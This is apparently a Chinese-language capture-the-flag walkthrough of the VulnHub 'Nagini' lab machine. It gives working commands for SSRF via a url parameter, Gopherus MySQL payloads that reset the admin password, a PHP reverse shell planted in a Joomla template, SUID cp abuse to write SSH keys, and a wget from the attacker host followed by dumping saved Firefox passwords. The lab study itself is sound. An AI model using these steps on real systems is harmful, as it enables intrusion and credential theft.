靶机地址：[HarryPotter: Nagini ~ VulnHub](https://vulnhub.com/entry/harrypotter-nagini,689/)
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.101
sudo nmap -p22,80 -sV 192.168.1.101
# 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```
web路径扫描
```Shell
sudo dirsearch -u http://192.168.1.101
# /joomla
# /joomla/administrator
sudo dirsearch -u http://192.168.1.101/joomla
# /joomla/README.txt
# /joomla/configuration.php.bak
# /joomla/htaccess.txt
# /joomla/robots.txt
# /joomla/web.config.txt
```
看了一下，只有 `/joomla/configuration.php.bak` 里面有一些信息
```php
public $sitename = 'Joomla CMS';
public $editor = 'tinymce';
public $dbtype = 'mysqli';
public $host = 'localhost';
public $user = 'goblin';
public $password = '';
public $db = 'joomla';
public $dbprefix = 'joomla_';
public $secret = 'ILhwP6HTYKcN7qMh';
public $mailfrom = 'site_admin@nagini.hogwarts';
public $log_path = '/var/www/html/joomla/administrator/logs';
public $tmp_path = '/var/www/html/joomla/tmp';
```
扩大一下字典
```Shell
sudo dirsearch -u http://192.168.1.101 -f -e html,php,txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
# /note.txt
```
访问 `/note.txt` 内容大致为，将在使用了HTTP/3的 `https://quic.nagini.hogwarts` 进一步沟通
`code .\drivers\etc\hosts`
```
# nagini.hogwarts
192.168.1.101    quic.nagini.hogwarts
```
启动HTTP/3客户端，访问 `https://quic.nagini.hogwarts` ，得到如下提示：`/internalResourceFeTcher.php` ，访问这个路径，提示内部网络资源获取，有一个 `url` 参数
```
/internalResourceFeTcher.php?url=file:///etc/passwd
/internalResourceFeTcher.php?url=http://127.0.0.1
/internalResourceFeTcher.php?url=gopher://127.0.0.1:22
```
生成利用Payload
```Shell
./gopherus.py --exploit mysql
# Give MySQL username: goblin
# Give query to execute: use joomla; show tables;

# select column_name from information_schema.columns where table_name="joomla_users";

# select id, username, password from joomla.joomla_users;
```
查出的用户ID、账号和密码为
```
675
site_admin
$2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay
```
这个密码想要破解比较麻烦，可以换个思路更新这个字段，修改密码
```Shell
echo -n "aaaabbbb" | md5sum
# c622054d9e6f17b43814ad5d61cab239
```
再次生成Payload
```Shell
./gopherus.py --exploit mysql
# update joomla.joomla_users set password="c622054d9e6f17b43814ad5d61cab239" where id = 675;
```
成功登录进后台，修改模板中的代码，直接上传也行，代码参考：
```Shell
cp /usr/share/webshells/php/php-reverse-shell.php .
vim php-reverse-shell.php # 改一下IP和端口号
cat php-reverse-shell.php
```
成功后开启监听，访问对应路径，如 `/joomla/templates/beez3/index.php`
成功获得反弹shell，尝试提权
简单信息收集了一下，发现 `hermoine` 用户的目录下有SUID文件，可能是要先提权到 `hermoine`
在另一个用户 `snape` 的目录下发现一个隐藏文件 `.creds.txt` 可读，内容如下
```
TG92ZUBsaWxseQ==
```
解码后为 `Love@lilly` ，尝试SSH，成功登录 `snape` 用户
可以通过SUID文件提权到 `hermoine` ，看了下帮助，其实就是 `cp` 命令
思路：把本机的ssh公钥下载到靶机上，拷贝到 `hermoine` 的对应目录下
```Shell
/home/hermoine/bin/su_cp id_rsa.pub /home/hermoine/.ssh/authorized_keys
```
再通过SSH成功登录 `hermoine` ，根目录下发现 `.mozilla` 目录
可以尝试获取浏览器中的机密信息
```Shell
wget http://192.168.1.26:7331/hack-browser-data-linux-amd64
chmod +x hack-browser-data-linux-amd64
./hack-browser-data-linux-amd64 --browser firefox
# UserName,Password,LoginURL,CreateDate
# root,@Alohomora#123,,2021-04-04T11:35:57+05:30
```
用这个账号密码成功登录root用户
